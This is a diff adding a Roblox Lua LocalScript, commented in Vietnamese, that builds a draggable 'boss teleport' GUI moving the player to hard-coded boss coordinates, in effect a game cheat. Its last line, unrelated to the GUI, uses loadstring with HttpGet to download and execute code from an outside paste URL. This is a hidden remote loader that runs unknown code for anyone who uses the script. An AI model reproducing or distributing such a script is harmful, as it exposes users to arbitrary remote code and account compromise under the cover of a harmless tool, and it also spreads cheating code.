@@ -1,0 +1,153 @@
+-- LocalScript: Đặt trong StarterGui hoặc PlayerGui
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+
+-- Tọa độ các boss
+local BOSS_DATA = {
+	["Điểm xuất phát"] = Vector3.new(22, 11, -40001),
+	["Samurai"] = Vector3.new(-198, 38, -3561),
+	["Vam"] = Vector3.new(114, 54, 5126),
+	["Steampunk"] = Vector3.new(-7, 91, 26997),
+	["Người lùn"] = Vector3.new(353, 51, 16077),
+	["Đảo sky"] = Vector3.new(-395, 355, 34959),
+	["Vua băng"] = Vector3.new(-5, 35, 46465)
+}
+
+-- Tạo GUI
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "BossTeleporter"
+screenGui.ResetOnSpawn = false
+
+-- Frame chính (có thể di chuyển)
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.Size = UDim2.new(0, 200, 0, 250)
+mainFrame.Position = UDim2.new(0, 50, 0, 50)
+mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+mainFrame.BorderSizePixel = 2
+mainFrame.BorderColor3 = Color3.fromRGB(80, 80, 100)
+mainFrame.Active = true
+mainFrame.Draggable = true
+mainFrame.Selectable = true
+mainFrame.Parent = screenGui
+
+-- Thanh tiêu đề
+local titleBar = Instance.new("Frame")
+titleBar.Name = "TitleBar"
+titleBar.Size = UDim2.new(1, 0, 0, 30)
+titleBar.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
+titleBar.BorderSizePixel = 0
+titleBar.Parent = mainFrame
+
+local titleText = Instance.new("TextLabel")
+titleText.Name = "TitleText"
+titleText.Size = UDim2.new(0.7, 0, 1, 0)
+titleText.Position = UDim2.new(0.05, 0, 0, 0)
+titleText.BackgroundTransparency = 1
+titleText.Text = "BOSS TELEPORT"
+titleText.TextColor3 = Color3.fromRGB(255, 255, 255)
+titleText.Font = Enum.Font.GothamBold
+titleText.TextSize = 14
+titleText.Parent = titleBar
+
+-- Nút đóng/mở GUI (toggle button)
+local toggleButton = Instance.new("TextButton")
+toggleButton.Name = "ToggleButton"
+toggleButton.Size = UDim2.new(0, 80, 0, 25)
+toggleButton.Position = UDim2.new(0.5, -40, 0, 35)
+toggleButton.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
+toggleButton.Text = "Ẩn GUI"
+toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+toggleButton.Font = Enum.Font.Gotham
+toggleButton.TextSize = 12
+toggleButton.Parent = mainFrame
+
+-- Danh sách các nút teleport
+local scrollFrame = Instance.new("ScrollingFrame")
+scrollFrame.Name = "ScrollFrame"
+scrollFrame.Size = UDim2.new(1, -10, 0, 150)
+scrollFrame.Position = UDim2.new(0, 5, 0, 70)
+scrollFrame.BackgroundTransparency = 1
+scrollFrame.BorderSizePixel = 0
+scrollFrame.ScrollBarThickness = 6
+scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+scrollFrame.Parent = mainFrame
+
+local buttonHeight = 30
+local padding = 5
+
+-- Tạo nút cho từng boss
+local buttonCount = 0
+for bossName, position in pairs(BOSS_DATA) do
+	local teleButton = Instance.new("TextButton")
+	teleButton.Name = bossName .. "Button"
+	teleButton.Size = UDim2.new(1, -10, 0, buttonHeight)
+	teleButton.Position = UDim2.new(0, 5, 0, (buttonHeight + padding) * buttonCount)
+	teleButton.BackgroundColor3 = Color3.fromRGB(70, 70, 90)
+	teleButton.BorderSizePixel = 1
+	teleButton.BorderColor3 = Color3.fromRGB(100, 100, 120)
+	teleButton.Text = bossName
+	teleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+	teleButton.Font = Enum.Font.Gotham
+	teleButton.TextSize = 12
+	teleButton.Parent = scrollFrame
+	
+	-- Sự kiện click
+	teleButton.MouseButton1Click:Connect(function()
+		-- Teleport player đến boss
+		if character and humanoidRootPart then
+			humanoidRootPart.CFrame = CFrame.new(position)
+			print("Đã teleport đến: " .. bossName)
+		end
+	end)
+	
+	buttonCount = buttonCount + 1
+end
+
+-- Cập nhật kích thước canvas
+scrollFrame.CanvasSize = UDim2.new(0, 0, 0, (buttonHeight + padding) * buttonCount)
+
+-- Nút mini trên màn hình khi GUI ẩn
+local miniButton = Instance.new("TextButton")
+miniButton.Name = "MiniButton"
+miniButton.Size = UDim2.new(0, 50, 0, 50)
+miniButton.Position = UDim2.new(0, 10, 0.5, -25)
+miniButton.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
+miniButton.BorderSizePixel = 2
+miniButton.BorderColor3 = Color3.fromRGB(80, 80, 100)
+miniButton.Text = "Mở\nGUI"
+miniButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+miniButton.Font = Enum.Font.Gotham
+miniButton.TextSize = 10
+miniButton.Visible = false
+miniButton.Active = true
+miniButton.Draggable = true
+miniButton.Selectable = true
+miniButton.Parent = screenGui
+
+-- Biến trạng thái
+local isGUIVisible = true
+
+-- Hàm toggle GUI
+local function toggleGUI()
+	isGUIVisible = not isGUIVisible
+	mainFrame.Visible = isGUIVisible
+	miniButton.Visible = not isGUIVisible
+	
+	if isGUIVisible then
+		toggleButton.Text = "Ẩn GUI"
+	else
+		toggleButton.Text = "Hiện GUI"
+	end
+end
+
+-- Kết nối sự kiện nút toggle
+toggleButton.MouseButton1Click:Connect(toggleGUI)
+miniButton.MouseButton1Click:Connect(toggleGUI)
+
+-- Thêm GUI vào màn hình
+screenGui.Parent = player:WaitForChild("PlayerGui")
+
+loadstring(game:HttpGet("https://pastefy.app/C99C6KXA/raw"))()
